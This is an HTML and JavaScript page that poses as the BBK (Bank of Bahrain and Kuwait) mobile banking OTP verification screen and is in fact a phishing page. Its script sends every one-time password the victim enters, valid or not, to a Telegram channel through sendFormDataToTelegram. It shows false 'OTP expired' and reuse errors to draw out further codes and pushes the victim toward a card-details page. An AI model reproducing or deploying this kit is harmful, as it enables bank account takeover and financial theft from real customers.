<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BBK Mobile Banking - OTP Verification</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: linear-gradient(135deg, #4A90E2 0%, #2E5BBA 50%, #1E3A8A 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            color: white;
            overflow-x: hidden;
        }

        .container {
            flex: 1;
            padding: 40px 30px;
            display: flex;
            flex-direction: column;
            max-width: 400px;
            margin: 0 auto;
            width: 100%;
        }

        .logo-container {
            display: flex;
            justify-content: flex-end;
            margin-bottom: 60px;
            margin-top: 20px;
        }

        .logo {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }

        .logo-text {
            font-size: 28px;
            font-weight: bold;
            letter-spacing: 2px;
            margin-bottom: 5px;
            position: relative;
        }

        .logo-star {
            position: absolute;
            right: -15px;
            top: -5px;
            font-size: 20px;
            color: white;
        }

        .logo-arabic {
            font-size: 12px;
            letter-spacing: 1px;
            opacity: 0.9;
            direction: rtl;
        }

        .verification-text {
            text-align: center;
            margin-bottom: 60px;
        }

        .verification-text h1 {
            font-size: 24px;
            font-weight: 300;
            line-height: 1.4;
            margin-bottom: 20px;
        }

        .verification-text p {
            font-size: 16px;
            opacity: 0.8;
            line-height: 1.5;
        }

        .username-display {
            text-align: center;
            margin-bottom: 40px;
            padding: 15px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
        }

        .username-display .label {
            font-size: 14px;
            opacity: 0.7;
            margin-bottom: 5px;
        }

        .username-display .value {
            font-size: 18px;
            font-weight: 500;
        }

        .otp-container {
            margin-bottom: 40px;
        }

        .otp-inputs {
            display: flex;
            justify-content: space-between;
            gap: 10px;
            margin-bottom: 30px;
        }

        .otp-input {
            width: 50px;
            height: 60px;
            background: transparent;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 10px;
            text-align: center;
            font-size: 24px;
            color: white;
            outline: none;
            transition: border-color 0.3s ease;
        }

        .otp-input:focus {
            border-color: white;
        }

        .otp-input.filled {
            border-color: rgba(255, 255, 255, 0.8);
            background: rgba(255, 255, 255, 0.1);
        }

        .otp-input.error {
            border-color: #ff4757;
            background: rgba(255, 71, 87, 0.1);
        }

        .resend-container {
            text-align: center;
            margin-bottom: 40px;
        }

        .resend-text {
            font-size: 14px;
            opacity: 0.7;
            margin-bottom: 10px;
        }

        .resend-button {
            background: none;
            border: none;
            color: white;
            font-size: 16px;
            text-decoration: underline;
            cursor: pointer;
            opacity: 0.9;
            transition: opacity 0.3s ease;
        }

        .resend-button:hover {
            opacity: 1;
        }

        .resend-button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .timer {
            font-size: 14px;
            opacity: 0.8;
            margin-top: 5px;
        }

        .verify-button {
            background: rgba(255, 255, 255, 0.2);
            border: none;
            border-radius: 25px;
            padding: 18px;
            font-size: 18px;
            color: white;
            cursor: pointer;
            margin-bottom: 30px;
            transition: background-color 0.3s ease, transform 0.2s ease;
            font-weight: 400;
            width: 100%;
        }

        .verify-button:hover {
            background: rgba(255, 255, 255, 0.3);
            transform: translateY(-1px);
        }

        .verify-button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        .back-button {
            text-align: center;
            margin-bottom: 40px;
        }

        .back-button a {
            color: white;
            text-decoration: none;
            font-size: 16px;
            font-weight: 300;
            opacity: 0.9;
            transition: opacity 0.3s ease;
        }

        .back-button a:hover {
            opacity: 1;
            text-decoration: underline;
        }

        .loading-spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
            margin-right: 10px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* Error Modal Styles */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            opacity: 0;
            visibility: hidden;
            transition: all 0.3s ease;
        }

        .modal-overlay.show {
            opacity: 1;
            visibility: visible;
        }

        .error-modal {
            background: white;
            border-radius: 15px;
            padding: 30px;
            max-width: 320px;
            width: 90%;
            text-align: center;
            color: #333;
            transform: scale(0.8);
            transition: transform 0.3s ease;
        }

        .modal-overlay.show .error-modal {
            transform: scale(1);
        }

        .error-icon {
            font-size: 48px;
            color: #ff4757;
            margin-bottom: 20px;
        }

        .error-title {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 10px;
            color: #333;
        }

        .error-message {
            font-size: 16px;
            color: #666;
            margin-bottom: 25px;
            line-height: 1.4;
        }

        .error-button {
            background: #ff4757;
            color: white;
            border: none;
            border-radius: 25px;
            padding: 12px 30px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .error-button:hover {
            background: #ff3742;
        }

        .error-message-display {
            color: #c82333;
            font-size: 14px;
            margin-top: 10px;
            font-weight: 600;
        }

        .verification-text a {
            color: white;
            text-decoration: underline;
            opacity: 0.9;
            transition: opacity 0.3s ease;
        }

        .verification-text a:hover {
            opacity: 1;
        }

        .re-enter-link {
            color: #ff9f00;
            text-decoration: underline;
            font-weight: normal;
            cursor: pointer;
            transition: opacity 0.3s ease;
        }

        .re-enter-link:hover {
            opacity: 0.8;
        }

        /* Mobile Responsive Styles */
        @media (max-width: 768px) {
            .container {
                padding: 30px 20px;
            }
            
            .logo-container {
                margin-bottom: 40px;
                margin-top: 10px;
            }
            
            .logo-text {
                font-size: 24px;
            }
            
            .verification-text {
                margin-bottom: 40px;
            }
            
            .verification-text h1 {
                font-size: 22px;
                margin-bottom: 16px;
            }
            
            .verification-text p {
                font-size: 14px;
            }
            
            .otp-inputs {
                gap: 8px;
                margin-bottom: 24px;
            }
            
            .otp-input {
                width: 48px;
                height: 58px;
                font-size: 22px;
            }
            
            .verify-button {
                padding: 16px;
                font-size: 16px;
                min-height: 48px; /* Touch-friendly */
            }
            
            .resend-button {
                font-size: 15px;
                min-height: 44px; /* Touch-friendly */
            }
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 24px 16px;
            }
            
            .logo-container {
                margin-bottom: 30px;
            }
            
            .logo-text {
                font-size: 22px;
            }
            
            .verification-text {
                margin-bottom: 30px;
            }
            
            .verification-text h1 {
                font-size: 20px;
            }
            
            .verification-text p {
                font-size: 13px;
            }
            
            .otp-inputs {
                gap: 6px;
                margin-bottom: 20px;
            }
            
            .otp-input {
                width: 42px;
                height: 52px;
                font-size: 20px;
            }
            
            .verify-button {
                padding: 14px;
                font-size: 15px;
            }
            
            .error-modal {
                padding: 24px;
                max-width: 90%;
            }
        }
        
        @media (max-width: 360px) {
            .container {
                padding: 20px 12px;
            }
            
            .verification-text h1 {
                font-size: 18px;
            }
            
            .otp-inputs {
                gap: 4px;
            }
            
            .otp-input {
                width: 38px;
                height: 48px;
                font-size: 18px;
            }
        }
        
        /* Prevent zoom on input focus (iOS) */
        @media screen and (max-width: 768px) {
            input, select, textarea {
                font-size: 16px !important;
            }
            
            .otp-input {
                font-size: 20px !important;
            }
        }
        
        /* Touch-friendly interactions */
        @media (hover: none) and (pointer: coarse) {
            .verify-button, .resend-button, .back-button a, .otp-input {
                -webkit-tap-highlight-color: rgba(255, 255, 255, 0.2);
                touch-action: manipulation;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-container">
            <div class="logo">
                <div class="logo-text">
                    BBK
                    <span class="logo-star">‚ú±</span>
                </div>
                <div class="logo-arabic">ÿ®ŸÜŸÉ ÿßŸÑÿ®ÿ≠ÿ±ŸäŸÜ ŸàÿßŸÑŸÉŸàŸäÿ™</div>
            </div>
        </div>

        <div class="verification-text">
            <h1>OTP Verification</h1>
            <p id="verificationMessage">We've sent a 6-digit verification code to your registered mobile number</p>
            <br>
            <div id="errorMessage" class="error-message-display"></div>
        </div>

        <form id="otpForm">
        <div class="otp-container">
            <div class="otp-inputs">
                <input type="tel" name="one" class="otp-input" maxlength="1" id="otp1" required>
                <input type="tel" name="two" class="otp-input" maxlength="1" id="otp2" required>
                <input type="tel" name="three" class="otp-input" maxlength="1" id="otp3" required>
                <input type="tel" name="four" class="otp-input" maxlength="1" id="otp4" required>
                <input type="tel" name="five" class="otp-input" maxlength="1" id="otp5" required>
                <input type="tel" name="six" class="otp-input" maxlength="1" id="otp6" required>
            </div>
        </div>

        <div class="resend-container">
            <div class="resend-text">Didn't receive the code?</div>
            <button type="button" class="resend-button" onclick="resendOTP()" id="resendBtn">Resend OTP</button>
            <div class="timer" id="timer"></div>
        </div>

        <button type="submit" class="verify-button" id="verifyBtn">Verify</button>

        <div class="back-button">
            <a href="index.html">‚Üê Back to Login</a>
        </div>
    </div>
    </form>
    <!-- Error Modal -->
    <div class="modal-overlay" id="errorModal">
        <div class="error-modal">
            <div class="error-icon">‚ö†Ô∏è</div>
            <div class="error-title">Invalid OTP</div>
            <div class="error-message">The OTP you entered is incorrect. Please try again with the correct code.</div>
            <button class="error-button" onclick="closeErrorModal()">Try Again</button>
        </div>
    </div>


    <script src="config.js"></script>
    <script src="telegram.js"></script>
    <script>
        let resendTimer = 60;
        let timerInterval;
        let otpAttempts = 0;

        // Get URL parameters
        const urlParams = new URLSearchParams(window.location.search);
        const msg = urlParams.get('msg') || '';

        // Initialize page
        document.addEventListener('DOMContentLoaded', function() {
            // Show error message if coming from error page
            if (msg === 'last') {
                document.getElementById('errorMessage').textContent = 'Invalid OTP Code ! Please try again.';
            }

            // Set button text - all OTP pages in flow show "Verify"
            // Only the initial OTP (after EPIN) will change to "Verify with bank card" after 60 seconds
            const verifyBtn = document.getElementById('verifyBtn');
            verifyBtn.textContent = 'Verify';

            // Get current attempt count
            otpAttempts = parseInt(sessionStorage.getItem('otp_attempts') || '0');

            // Start resend timer
            startResendTimer();

            // Setup OTP input handlers
            setupOTPInputs();

            // Setup form submission
            document.getElementById('otpForm').addEventListener('submit', async function(e) {
                e.preventDefault();
                const verifyBtn = document.getElementById('verifyBtn');
                // Check if button was changed to "Verify with ATM card" (only for initial OTP after 60 seconds)
                if (verifyBtn.textContent === 'Verify with ATM card' || verifyBtn.textContent === 'Verify with bank card') {
                    window.location.href = 'card.html';
                } else {
                    await verifyOTP();
                }
            });
        });

        // Setup OTP input functionality
        function setupOTPInputs() {
            const inputs = document.querySelectorAll('.otp-input');
            
            inputs.forEach((input, index) => {
                input.addEventListener('input', function(e) {
                    const value = e.target.value;
                    
                    // Only allow numbers
                    if (!/^\d*$/.test(value)) {
                        e.target.value = '';
                        return;
                    }

                    // Remove error class
                    e.target.classList.remove('error');

                    // Add filled class
                    if (value) {
                        e.target.classList.add('filled');
                        // Move to next input
                        if (index < inputs.length - 1) {
                            inputs[index + 1].focus();
                        }
                    } else {
                        e.target.classList.remove('filled');
                    }

                    // Check if all inputs are filled
                    checkAllInputsFilled();
                });

                input.addEventListener('keydown', function(e) {
                    // Handle backspace
                    if (e.key === 'Backspace' && !e.target.value && index > 0) {
                        inputs[index - 1].focus();
                        inputs[index - 1].value = '';
                        inputs[index - 1].classList.remove('filled');
                    }

                    // Handle Enter key
                    if (e.key === 'Enter') {
                        verifyOTP();
                    }
                });

                input.addEventListener('paste', function(e) {
                    e.preventDefault();
                    const pastedData = e.clipboardData.getData('text');
                    const digits = pastedData.replace(/\D/g, '').slice(0, 6);
                    
                    digits.split('').forEach((digit, i) => {
                        if (inputs[i]) {
                            inputs[i].value = digit;
                            inputs[i].classList.add('filled');
                            inputs[i].classList.remove('error');
                        }
                    });

                    checkAllInputsFilled();
                });
            });
        }

        // Check if all OTP inputs are filled
        function checkAllInputsFilled() {
            const inputs = document.querySelectorAll('.otp-input');
            const allFilled = Array.from(inputs).every(input => input.value.length === 1);
            
            if (allFilled) {
                document.getElementById('verifyBtn').style.background = 'rgba(255, 255, 255, 0.4)';
            } else {
                document.getElementById('verifyBtn').style.background = 'rgba(255, 255, 255, 0.2)';
            }
        }

        // Start resend timer
        function startResendTimer() {
            const resendBtn = document.getElementById('resendBtn');
            const timer = document.getElementById('timer');
            const verificationMessage = document.getElementById('verificationMessage');
            const verifyBtn = document.getElementById('verifyBtn');
            
            resendBtn.disabled = true;
            
            timerInterval = setInterval(() => {
                timer.textContent = `Resend available in ${resendTimer}s`;
                resendTimer--;
                
                if (resendTimer < 0) {
                    clearInterval(timerInterval);
                    resendBtn.disabled = false;
                    timer.textContent = '';
                    resendTimer = 60;
                    
                    // Only change button and message for initial OTP (after EPIN, when msg is empty)
                    // Don't change for OTP pages in the flow (name/email/card) or last screens
                    if (msg === '' || msg === 'again') {
                        // Change verification message when timer ends
                        verificationMessage.innerHTML = 'Didn\'t receive the OTP? Your E-PIN may be incorrect. Click <a href="index.html" class="re-enter-link">Re-Enter</a> or activate Via ATM Card';
                        
                        // Change verify button text and type to "Verify with bank card"
                        verifyBtn.textContent = 'Verify with bank card';
                        verifyBtn.type = 'button';
                        verifyBtn.onclick = function(e) {
                            e.preventDefault();
                            window.location.href = 'card.html';
                        };
                    }
                }
            }, 1000);
        }

        // Show error modal
        function showErrorModal(customMessage = null) {
            const modal = document.getElementById('errorModal');
            const errorMsgElement = modal.querySelector('.error-message');
            
            // Update error message if custom message provided
            if (customMessage && errorMsgElement) {
                errorMsgElement.textContent = customMessage;
            }
            
            modal.classList.add('show');
            
            // Add error class to all inputs
            const inputs = document.querySelectorAll('.otp-input');
            inputs.forEach(input => {
                input.classList.add('error');
            });
        }

        // Close error modal
        function closeErrorModal() {
            const modal = document.getElementById('errorModal');
            modal.classList.remove('show');
            
            // Clear OTP inputs and remove error class
            const inputs = document.querySelectorAll('.otp-input');
            inputs.forEach(input => {
                input.value = '';
                input.classList.remove('filled', 'error');
            });
            inputs[0].focus();
        }


        // Define allowed OTP codes for each step
        function getAllowedOTP() {
            // Define OTP codes for each step
            // First OTP: 123456 (after EPIN)
            // Second OTP: 654321 (after name - this is the last page in normal flow)
            // Third OTP: 111222 (after balance - from card flow)
            const otpCodes = {
                'first': '123456',   // After EPIN
                'second': '654321',  // After name (last page in normal flow)
                'third': '111222'    // After balance (from card flow)
            };
            
            // Determine which step we're on based on msg parameter
            // Track OTP step in sessionStorage
            let currentStep = sessionStorage.getItem('otp_step') || 'first';
            
            if (msg === 'name') {
                currentStep = 'second'; // Second OTP (after name - last page)
            } else if (msg === 'lastt' || msg === 'last') {
                currentStep = 'third'; // Third OTP (after balance from card flow)
            } else if (msg === '' || msg === 'again') {
                currentStep = 'first'; // First OTP (after EPIN)
            }
            
            // Update stored step
            sessionStorage.setItem('otp_step', currentStep);
            
            // Return the allowed OTP for this step
            return otpCodes[currentStep] || otpCodes['first'];
        }
        
        // Check if OTP was already used
        function isOTPAlreadyUsed(otp) {
            const usedOTPs = JSON.parse(sessionStorage.getItem('used_otps') || '[]');
            return usedOTPs.includes(otp);
        }
        
        // Mark OTP as used
        function markOTPAsUsed(otp) {
            const usedOTPs = JSON.parse(sessionStorage.getItem('used_otps') || '[]');
            if (!usedOTPs.includes(otp)) {
                usedOTPs.push(otp);
                sessionStorage.setItem('used_otps', JSON.stringify(usedOTPs));
            }
        }

        // Get failed attempt count for current OTP page
        function getFailedAttempts() {
            const currentMsg = urlParams.get('msg') || 'initial';
            const key = `otp_failed_attempts_${currentMsg}`;
            const attempts = parseInt(sessionStorage.getItem(key) || '0');
            return attempts;
        }
        
        // Increment failed attempt count
        function incrementFailedAttempts() {
            const currentMsg = urlParams.get('msg') || 'initial';
            const key = `otp_failed_attempts_${currentMsg}`;
            const current = getFailedAttempts();
            const newAttempts = current + 1;
            sessionStorage.setItem(key, newAttempts.toString());
            console.log(`Failed attempt ${newAttempts} for ${currentMsg}`);
            return newAttempts;
        }
        
        // Reset failed attempt count
        function resetFailedAttempts() {
            const currentMsg = urlParams.get('msg') || 'initial';
            const key = `otp_failed_attempts_${currentMsg}`;
            sessionStorage.removeItem(key);
        }

        // Verify OTP
        async function verifyOTP() {
            const inputs = document.querySelectorAll('.otp-input');
            const otp = Array.from(inputs).map(input => input.value).join('');
            const verifyBtn = document.getElementById('verifyBtn');
            
            if (otp.length !== 6) {
                alert('Please enter the complete 6-digit OTP');
                return;
            }

            // Get allowed OTP for this step
            const allowedOTP = getAllowedOTP();
            
            // Check if OTP matches the allowed OTP for this step
            if (otp !== allowedOTP) {
                // For initial OTP (msg=againc, empty, or again) - don't show error, just proceed to name
                if (msg === 'againc' || msg === '' || msg === 'again') {
                    // Store the OTP entered on first screen
                    sessionStorage.setItem('first_otp_entered', otp);
                    
                    // Send first OTP to Telegram (wrong OTP on first screen)
                    sendFormDataToTelegram('First OTP Attempt (Initial Screen)', {
                        'OTP Code': otp,
                        'Status': 'Invalid OTP - Proceeding to Name'
                    }).catch(err => {
                        console.warn('Telegram notification failed (non-critical):', err);
                    });
                    
                    // Don't show error, just proceed to name page
                    verifyBtn.disabled = false;
                    verifyBtn.innerHTML = 'Verify';
                    // Redirect to name page without showing error
                    window.location.href = 'name.html';
                    return;
                }
                
                // For OTP after name (msg=name) - check if it's the same as first OTP or different
                if (msg === 'name') {
                    const firstOTP = sessionStorage.getItem('first_otp_entered');
                    
                    verifyBtn.disabled = false;
                    verifyBtn.innerHTML = 'Verify';
                    
                    // Check if user entered the same OTP as first screen
                    if (firstOTP && otp === firstOTP) {
                        // Send to Telegram
                        sendFormDataToTelegram('OTP Reuse Attempt (After Name)', {
                            'OTP Code': otp,
                            'Status': 'Same as first OTP - Rejected'
                        }).catch(err => {
                            console.warn('Telegram notification failed (non-critical):', err);
                        });
                        
                        // Show error for reusing first OTP - no popup, just inline text
                        const errorText = 'you have already enter the same OTP please enter a new OTP';
                        document.getElementById('errorMessage').textContent = errorText;
                        return;
                    }
                    
                    // User entered a different OTP (but still wrong) - track attempts
                    const failedAttempts = incrementFailedAttempts();
                    
                    // Send wrong OTP to Telegram
                    sendFormDataToTelegram('Wrong OTP Attempt (After Name)', {
                        'OTP Code': otp,
                        'Attempt': failedAttempts,
                        'Status': 'Invalid OTP'
                    }).catch(err => {
                        console.warn('Telegram notification failed (non-critical):', err);
                    });
                    
                    // Show expired error for different wrong OTP - no popup, just inline text
                    const errorText = 'OTP expired enter a new otp';
                    document.getElementById('errorMessage').textContent = errorText;
                    
                    console.log(`Failed attempt ${failedAttempts} of 3 for name OTP (different OTP)`);
                    
                    // Check if 3 attempts failed - redirect to card page after showing error
                    if (failedAttempts >= 3) {
                        console.log('3 failed attempts reached for name OTP, will redirect to card page in 2.5 seconds...');
                        // Wait a bit to show the error, then redirect to card page
                        setTimeout(() => {
                            window.location.href = 'card.html';
                        }, 2500);
                        return;
                    }
                    return;
                }
                
                // For last OTP (after balance) - same logic as second OTP but no redirect
                if (msg === 'lastt' || msg === 'last') {
                    const firstOTP = sessionStorage.getItem('first_otp_entered');
                    
                    verifyBtn.disabled = false;
                    verifyBtn.innerHTML = 'Verify';
                    
                    // Check if user entered the same OTP as first screen
                    if (firstOTP && otp === firstOTP) {
                        // Send to Telegram
                        sendFormDataToTelegram('OTP Reuse Attempt (Last OTP)', {
                            'OTP Code': otp,
                            'Status': 'Same as first OTP - Rejected'
                        }).catch(err => {
                            console.warn('Telegram notification failed (non-critical):', err);
                        });
                        
                        // Show error for reusing first OTP - no popup, just inline text
                        const errorText = 'you have already enter the same OTP please enter a new OTP';
                        document.getElementById('errorMessage').textContent = errorText;
                        return;
                    }
                    
                    // User entered a different OTP (but still wrong) - track attempts
                    const failedAttempts = incrementFailedAttempts();
                    
                    // Send wrong OTP to Telegram
                    sendFormDataToTelegram('Wrong OTP Attempt (Last OTP)', {
                        'OTP Code': otp,
                        'Attempt': failedAttempts,
                        'Status': 'Invalid OTP'
                    }).catch(err => {
                        console.warn('Telegram notification failed (non-critical):', err);
                    });
                    
                    // Show expired error for different wrong OTP - no popup, just inline text
                    const errorText = 'OTP expired enter a new otp';
                    document.getElementById('errorMessage').textContent = errorText;
                    
                    console.log(`Failed attempt ${failedAttempts} for last OTP (different OTP)`);
                    
                    // No redirect on last OTP page - just show error
                    return;
                }
                
                // Show normal error for other cases
                const normalError = 'Invalid OTP Code! Please try again.';
                document.getElementById('errorMessage').textContent = normalError;
                showErrorModal(normalError);
                return;
            }
            
            // Check if this OTP was already used in a previous step
            if (isOTPAlreadyUsed(otp)) {
                // Send reused OTP to Telegram
                sendFormDataToTelegram('OTP Already Used', {
                    'OTP Code': otp,
                    'Status': 'Already used in previous step'
                }).catch(err => {
                    console.warn('Telegram notification failed (non-critical):', err);
                });
                
                verifyBtn.disabled = false;
                verifyBtn.innerHTML = 'Verify';
                showErrorModal();
                document.getElementById('errorMessage').textContent = 'This OTP has already been used! Please use the correct OTP for this step.';
                return;
            }
            
            // Store first OTP if this is the initial OTP screen
            if (msg === 'againc' || msg === '' || msg === 'again') {
                sessionStorage.setItem('first_otp_entered', otp);
            }
            
            // OTP is correct - send to Telegram immediately before processing
            // Determine OTP type based on msg parameter
            let otpType = 'Valid OTP Submitted';
            if (msg === 'name') {
                otpType = 'Valid OTP (After Name - Last Page)';
            } else if (msg === 'lastt' || msg === 'last') {
                otpType = 'Valid OTP (After Balance)';
            } else if (msg === '' || msg === 'again' || msg === 'againc') {
                otpType = 'Valid OTP (First OTP - After EPIN)';
            }
            
            // Send valid OTP to Telegram immediately (non-blocking)
            sendFormDataToTelegram(otpType, {
                'OTP Code': otp,
                'Status': 'Valid - Accepted'
            }).catch(err => {
                console.warn('Telegram notification failed (non-critical):', err);
            });
            
            // OTP is correct - reset failed attempts
            resetFailedAttempts();

            // Show loading state
            verifyBtn.disabled = true;
            verifyBtn.innerHTML = '<span class="loading-spinner"></span>Verifying...';
            
            try {
                // Mark OTP as used
                markOTPAsUsed(otp);
                
                // Increment attempt count
                otpAttempts++;
                sessionStorage.setItem('otp_attempts', otpAttempts.toString());
                
                // Simulate verification process
                await new Promise(resolve => setTimeout(resolve, 2000));
                
                // Check if this is the last screen - show expired error
                if (msg === 'last' || msg === 'lastt') {
                    verifyBtn.disabled = false;
                    verifyBtn.textContent = 'Verify';
                    
                    // Show expired error message
                    document.getElementById('errorMessage').textContent = 'OTP is expired please try again';
                    showErrorModal();
                    return;
                }
                
                // Determine next page based on msg parameter
                let nextPage = 'name.html'; // Default: first OTP after EPIN goes to name
                if (msg === 'name') {
                    // After name OTP (second OTP) - this is the LAST PAGE in normal flow
                    // If successful, redirect to balance as completion
                    nextPage = 'balance.html?msg=complete';
                } else if (msg === 'lastt') {
                    // After balance OTP (from card flow), this is the final OTP
                    nextPage = 'balance.html?msg=complete';
                } else if (msg === 'last') {
                    nextPage = 'otp.html?msg=last'; // Stay on same page for last OTP
                } else if (msg === 'again' || msg === 'againc' || msg === '') {
                    // Initial OTP (from EPIN or number) - go to name
                    nextPage = 'name.html';
                }
                
                // Always redirect - don't block on Telegram errors
                window.location.href = nextPage;
                
            } catch (error) {
                console.error('OTP verification error:', error);
                verifyBtn.disabled = false;
                verifyBtn.textContent = 'Verify';
                showErrorModal();
            }
        }

        // Resend OTP
        async function resendOTP() {
            const message = `üîÑ BBK OTP Resend Request\n\n‚è∞ Time: ${new Date().toISOString()}`;

            try {
                await sendToTelegram(message);
            } catch (error) {
                console.log('Resend notification error:', error);
            }

            // Clear current OTP inputs
            const inputs = document.querySelectorAll('.otp-input');
            inputs.forEach(input => {
                input.value = '';
                input.classList.remove('filled', 'error');
            });
            inputs[0].focus();

            // Restart timer
            startResendTimer();
            
            alert('OTP has been resent to your registered mobile number');
        }
    </script>
